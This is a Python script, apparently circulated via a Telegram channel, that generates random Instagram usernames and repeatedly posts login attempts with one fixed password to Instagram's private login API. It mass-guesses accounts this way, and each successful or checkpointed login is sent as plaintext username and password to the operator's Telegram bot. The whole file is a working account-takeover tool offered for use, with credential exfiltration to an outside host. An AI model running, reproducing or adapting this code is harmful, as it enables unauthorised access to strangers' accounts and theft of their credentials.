import requests
import random
import pyfiglet,webbrowser
from uuid import uuid4
uid=str(uuid4())

Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[1;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[1;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
C = "\033[1;97m" #ابيض
lo = pyfiglet.figlet_format(' abud ')
print(Y+lo)

print(Z+'*'*60)
webbrowser.open('https://t.me/occult6')

pasw = str('1122334455')
ID = input(B+' ENTER ID : ')
token = input(B+' ENTER TOKEN : ')
print(Z+'*'*60)

a=0
s=0
d=0
us = "1234567890qwert._+fhyuiopasdfghjklzxcvb_nm_."

while True:
	ue = "6789"
	name = int(''.join(random.choice(ue)for a in range(1)))
	nao = str(''.join(random.choice(us)for a in range(name)))
	user = nao
	pas = pasw
	
	url = "https://i.instagram.com/api/v1/accounts/login/"
	
	
	he = {'User-Agent':'Instagram 6.12.1 Android (29/10; 480dpi; 1080x2137; HUAWEI/HONOR; JSN-L22; HWJSN-H; kirin710; ar_IR)', 'Accept':'*/*',  'Cookie':'missing', 
                 'Accept-Encoding':'gzip, deflate', 
                 'Accept-Language':'en-US', 
                 'X-IG-Capabilities':'3brTvw==', 
                 'X-IG-Connection-Type':'WIFI', 
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
                 'Host':'i.instagram.com'}
                 


	da = {'uuid':uid,  'password':pas, 'username':user, 
                 'device_id':uid, 
                 'from_reg':'false', 
                 '_csrftoken':'missing', 
                 'login_attempt_countn':'0'}
                 


	re = requests.post(url,headers=he,data=da).text
	a+=1
	s+=1
	d+=1
	if 'logged_in_user' in re:
		print(f'{F}[{d}]{F} Good '+user+':'+pas)
		tlg = f'''
username = {user}
password = {pas}
_________________________
PY : @occult963_ar  @occult6	
		
		'''
		
		
		
		requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(tlg))	
		
	elif '"hide_webview_header"' in re:
		print(f'{F}[{s}]{X}تم الصيد حمبي '+user+':'+pas)
		tlg = f'''
username = {user}
password = {pas}
\_________________________/
PY : @occult963_ar  @occult6		
		
		'''
		
		
		
		requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(tlg))
		
	else:
		print(f' {F}[{a}]{Z}فشل : '+user+':'+pas)